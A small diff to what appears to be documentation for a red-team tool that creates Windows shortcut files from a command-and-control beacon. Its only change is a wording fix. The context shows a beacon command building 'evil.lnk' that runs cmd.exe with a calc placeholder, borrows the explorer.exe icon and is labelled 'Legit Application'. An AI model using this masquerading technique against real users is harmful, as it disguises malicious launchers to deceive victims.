@@ -35,7 +35,7 @@ SHA-256: 17630EE28931B27DACAB2BB63ACBEAEBDF2B25D7C96BA6611D098C932CB6D44B
 [+] LNK created successfully!
 ```
 
-Create a LNK file while setting the LNK icon to `explorer.exe` and adding a description:
+Create a LNK file while setting the LNK icon to `explorer.exe` and add a description:
 ```
 beacon> bofnet_execute BOFNET.Bofs.LNKCreate c:\users\user\desktop\evil.lnk cmd.exe "/c calc.exe" C:\Windows\explorer.exe "Legit Application"
 [*] Attempting to execute BOFNET BOFNET.Bofs.LNKCreate
